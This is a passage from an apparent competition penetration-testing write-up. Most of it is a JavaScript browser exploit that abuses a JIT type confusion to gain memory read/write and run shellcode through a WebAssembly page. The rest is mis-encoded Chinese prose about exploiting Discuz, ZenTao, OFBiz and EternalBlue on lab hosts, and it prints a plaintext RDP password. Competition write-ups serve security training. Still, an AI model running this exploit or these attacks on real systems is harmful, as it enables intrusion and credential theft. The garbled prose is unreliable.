class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>112</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>145</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>114</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>138</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>42</span><span class=p>,</span> <span class=mi>11</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>wasmModule</span> <span class=o>=</span> <span class=n>new</span> <span class=n>WebAssembly</span><span class=o>.</span><span class=n>Module</span><span class=p>(</span><span class=n>wasmCode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>wasmInstance</span> <span class=o>=</span> <span class=n>new</span> <span class=n>WebAssembly</span><span class=o>.</span><span class=n>Instance</span><span class=p>(</span><span class=n>wasmModule</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>main</span> <span class=o>=</span> <span class=n>wasmInstance</span><span class=o>.</span><span class=n>exports</span><span class=o>.</span><span class=n>main</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>bf</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>bfView</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataView</span><span class=p>(</span><span class=n>bf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>fLow</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>(</span><span class=n>bfView</span><span class=o>.</span><span class=n>getUint32</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>fHi</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>(</span><span class=n>bfView</span><span class=o>.</span><span class=n>getUint32</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=bp>true</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>i2f</span><span class=p>(</span><span class=n>low</span><span class=p>,</span> <span class=n>hi</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setUint32</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>low</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setUint32</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>hi</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>bfView</span><span class=o>.</span><span class=n>getFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>f2big</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>bfView</span><span class=o>.</span><span class=n>getBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>big2f</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>bfView</span><span class=o>.</span><span class=n>getFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=k>class</span> <span class=n>LeakArrayBuffer</span> <span class=k>extends</span> <span class=n>ArrayBuffer</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>constructor</span><span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>           <span class=n>super</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>           <span class=n>this</span><span class=o>.</span><span class=n>slot</span> <span class=o>=</span> <span class=mh>0xb33f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>foo</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>x</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=k>if</span> <span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=n>x</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=k>var</span> <span class=n>arr</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>Array</span><span class=p>(</span><span class=n>Math</span><span class=o>.</span><span class=n>sign</span><span class=p>(</span><span class=mi>0</span> <span class=o>-</span> <span class=n>Math</span><span class=o>.</span><span class=n>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>       <span class=n>arr</span><span class=o>.</span><span class=n>shift</span><span class=p>();</span>
</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>local_arr</span> <span class=o>=</span> <span class=ne>Array</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=n>local_arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mf>5.1</span><span class=p>;</span><span class=o>//</span><span class=mi>4014666666666666</span>
</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>buff</span> <span class=o>=</span> <span class=n>new</span> <span class=n>LeakArrayBuffer</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span><span class=o>//</span><span class=n>byteLength</span> <span class=n>idx</span><span class=o>=</span><span class=mi>8</span>
</span></span><span class=line><span class=cl>       <span class=n>arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x1122</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>[</span><span class=n>arr</span><span class=p>,</span> <span class=n>local_arr</span><span class=p>,</span> <span class=n>buff</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=p>(</span><span class=k>var</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x10000</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=n>foo</span><span class=p>(</span><span class=bp>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>gc</span><span class=p>();</span> <span class=n>gc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>corrput_arr</span><span class=p>,</span> <span class=n>rwarr</span><span class=p>,</span> <span class=n>corrupt_buff</span><span class=p>]</span> <span class=o>=</span> <span class=n>foo</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>corrput_arr</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x22444</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>delete</span> <span class=n>corrput_arr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>setbackingStore</span><span class=p>(</span><span class=n>hi</span><span class=p>,</span> <span class=n>low</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>rwarr</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>i2f</span><span class=p>(</span><span class=n>fLow</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=mi>4</span><span class=p>]),</span> <span class=n>hi</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=n>rwarr</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=n>i2f</span><span class=p>(</span><span class=n>low</span><span class=p>,</span> <span class=n>fHi</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=mi>5</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>leakObjLow</span><span class=p>(</span><span class=n>o</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>corrupt_buff</span><span class=o>.</span><span class=n>slot</span> <span class=o>=</span> <span class=n>o</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>(</span><span class=n>fLow</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=mi>9</span><span class=p>])</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>corrupt_view</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataView</span><span class=p>(</span><span class=n>corrupt_buff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>corrupt_buffer_ptr_low</span> <span class=o>=</span> <span class=n>leakObjLow</span><span class=p>(</span><span class=n>corrupt_buff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>idx0Addr</span> <span class=o>=</span> <span class=n>corrupt_buffer_ptr_low</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>baseAddr</span> <span class=o>=</span> <span class=p>(</span><span class=n>corrupt_buffer_ptr_low</span> <span class=o>&amp;</span> <span class=mh>0xffff0000</span><span class=p>)</span> <span class=o>-</span> <span class=p>((</span><span class=n>corrupt_buffer_ptr_low</span> <span class=o>&amp;</span> <span class=mh>0xffff0000</span><span class=p>)</span> <span class=o>%</span> <span class=mh>0x40000</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x40000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>delta</span> <span class=o>=</span> <span class=n>baseAddr</span> <span class=o>+</span> <span class=mh>0x1c</span> <span class=o>-</span> <span class=n>idx0Addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=p>((</span><span class=n>delta</span> <span class=o>%</span> <span class=mi>8</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>baseIdx</span> <span class=o>=</span> <span class=n>delta</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=n>this</span><span class=o>.</span><span class=n>base</span> <span class=o>=</span> <span class=n>fLow</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=n>baseIdx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>baseIdx</span> <span class=o>=</span> <span class=p>((</span><span class=n>delta</span> <span class=o>-</span> <span class=p>(</span><span class=n>delta</span> <span class=o>%</span> <span class=mi>8</span><span class=p>))</span> <span class=o>/</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>       <span class=n>this</span><span class=o>.</span><span class=n>base</span> <span class=o>=</span> <span class=n>fHi</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=n>baseIdx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>wasmInsAddr</span> <span class=o>=</span> <span class=n>leakObjLow</span><span class=p>(</span><span class=n>wasmInstance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>setbackingStore</span><span class=p>(</span><span class=n>wasmInsAddr</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>code_entry</span> <span class=o>=</span> <span class=n>corrupt_view</span><span class=o>.</span><span class=n>getFloat64</span><span class=p>(</span><span class=mi>13</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>setbackingStore</span><span class=p>(</span><span class=n>fLow</span><span class=p>(</span><span class=n>code_entry</span><span class=p>),</span> <span class=n>fHi</span><span class=p>(</span><span class=n>code_entry</span><span class=p>));</span>
</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=p>(</span><span class=n>let</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>corrupt_view</span><span class=o>.</span><span class=n>setUint8</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>main</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>script</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œç”Ÿæˆçš„shellcodeæœ¬æ¥æ˜¯è¢«ç«ç»’æ€çš„äº†ï¼Œä½†æ˜¯æ¯”èµ›åˆ°ä¸€åŠä¸»åŠæ–¹è¯´åŸºäºå¾ˆå¤šäººæ²¡åšå‡ºæ¥ï¼Œå°±æŒ¨ä¸ªæŠŠç«ç»’å…³é—­äº†ï¼Œhhhã€‚åŸºæœ¬ä¸Šå¤§å®¶éƒ½èƒ½é€šè¿‡è¿™ä¸ªç›´æ¥ä¸Šçº¿äº†ã€‚</p><h3 id=4æ™ºæ…§æ°´åˆ©æœåŠ¡-1510070100>4ã€æ™ºæ…§æ°´åˆ©æœåŠ¡ 15.100.70.100</h3><p>è¿™ä¸€å°å°±æœ‰ç‚¹æ¶å¿ƒäº†ä¸Šé¢æœ‰4ä¸ªwebé¢˜ï¼Œ4ä¸ªflagã€‚ä½†æ˜¯å› ä¸ºåªæœ‰åŠå…¬ç”µè„‘é€šä»–ã€‚æˆ‘ä»¬æœ¬åœ°å’Œé—¨æˆ·å‡ä¸é€šï¼Œæ‰€ä»¥ä»£ç†è¿™ä¸€å—å°±å¾ˆè›‹ç–¼ï¼Œå…¶å®åªè¦ä»£ç†åˆ°äº†æœ¬åœ°å°±ä¸æ˜¯å¾ˆéš¾äº†ã€‚
åˆ†åˆ«æ˜¯
1ã€80ç«¯å£ discuz 7.2çš„rce
2ã€8080ç«¯å£ ç¦…é“cnvd_2020_121325
3ã€3030ç«¯å£ traggo è¿™ç©æ„åˆ°äº†åå° ä¸çŸ¥é“æ€ä¹ˆæ‰“
4ã€8443ç«¯å£çš„ofbiz ååºåˆ—åŒ–
è¿™é‡Œæ¯”è¾ƒæ¶å¿ƒçš„æ˜¯ç¦…é“å…¶å®æ˜¯åå°æ´ï¼Œéœ€è¦æ‰“äº†discuzç„¶åæ ¹ç›®å½•ä¸‹æ‹¿åˆ°flagï¼Œflagæ–‡ä»¶åé¢ç•™äº†ç¦…é“ç®¡ç†å‘˜çš„å¯†ç </p><h3 id=5å·¥ç¨‹å¸ˆç«™1921682100>5ã€å·¥ç¨‹å¸ˆç«™192.168.2.100</h3><p>åœ¨åŠå…¬ç”µè„‘ä¸Šæµè§ˆå™¨æ‰“å¼€äº†192çš„ä¸€ä¸ªç½‘ç«™ï¼ŒçŒœæµ‹å­˜åœ¨192æ®µçš„åœ°å€ã€‚ç„¶åæ‰«æç›´æ¥æ‰«åˆ°äº†192.168.2.100å­˜åœ¨æ°¸æ’ä¹‹è“ï¼Œæ­£è¦å»ç½‘ä¸Šä¸‹èµ„æ–™çš„æ—¶å€™ï¼Œä¸»åŠæ–¹æä¾›äº†ä¸€ä¸‹â€œæ°¸æ’ä¹‹è“åˆ©ç”¨å·¥å…·â€ï¼Œä»–çœŸçš„ï¼Œæˆ‘å“­æ­»ï¼Œç›´æ¥æ‰“äº†ä¸Š192.168.2.100ï¼Œ</p><h3 id=6æ“ä½œå‘˜ç«™1921682210>6ã€æ“ä½œå‘˜ç«™192.168.2.210</h3><p>æ¥ å“¥åœ¨ä¸Šé¢ç©å·¥æ§çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªè´¦å·å¯†ç ä¿¡æ¯
Operator Station&rsquo;s
IP:192.168.2.210
User:monitor
Password:nTwn3q3^ph71A
è¿™ä¸ªæ˜¯æ“ä½œå‘˜ç«™çš„å¯†ç ï¼ŒçŒœæµ‹æ˜¯rdpçš„ï¼Œå°±ç›´æ¥ä¸Šäº†ï¼Œç„¶åç”¨çŒ•çŒ´æ¡ƒè¯»å¯†ç rdpï¼Œç®¡ç†å‘˜æ¡Œé¢å­˜åœ¨ä¸€ä¸ªflagå’Œå‡ ä¸ªè½¯ä»¶ã€‚</p><h3 id=7å·¥æ§-1921682200>7ã€å·¥æ§ 192.168.2.200</h3><p>åœ¨210å’Œ110ä¸Šéƒ½æœ‰ä¸€äº›å·¥æ§ç›¸å…³çš„å†…å®¹ï¼Œæ¯”å¦‚210çš„ç®¡ç†å‘˜è´¦å·çš„æµè§ˆå™¨é»˜è®¤æ‰“å¼€äº†192.168.2.200
<img src=/img/2023-08-24-DFJKfinal/3.png alt></p><p>è‡³æ­¤æ¸—é€ç›¸å…³çš„åº”è¯¥éƒ½æ‰“äº†ï¼Œå…¶å®æ¼æ´éƒ½ä¸æ˜¯å¾ˆéš¾ï¼Œä¸»è¦æ˜¯ä»£ç†å¤ªå¤šå¾ˆéš¾å—ã€‚æ¥ä¸‹æ¥æŒ‰ç…§é¢˜ç›®çš„æè¿°æ˜¯åœ¨210ä¸Šå­˜åœ¨wiresharkè½¯ä»¶ï¼Œä½¿ç”¨wiresharkæŠ“210å’Œ220çš„é€šè®¯æµé‡åˆ†æåˆ¶å®šçš„é¢˜ç›®ã€‚</p><p><img src=/img/2023-08-24-DFJKfinal/4.jpg alt></p><p><img src=/img/2023-08-24-DFJKfinal/5.jpg alt></p><p>å·¥æ§wpå¾…ç»­&mldr;.</p><div class=blog-tags><a href=https://su-team.cn/tags/%E6%B8%97%E9%80%8F/>æ¸—é€</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/gyb-2023-su-wu/>2023 è´µé˜³å¤§æ•°æ®ç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ› SU Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/gyb-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 è´µé˜³å¤§æ•°æ®ç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ› SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/actf-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 ACTF SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>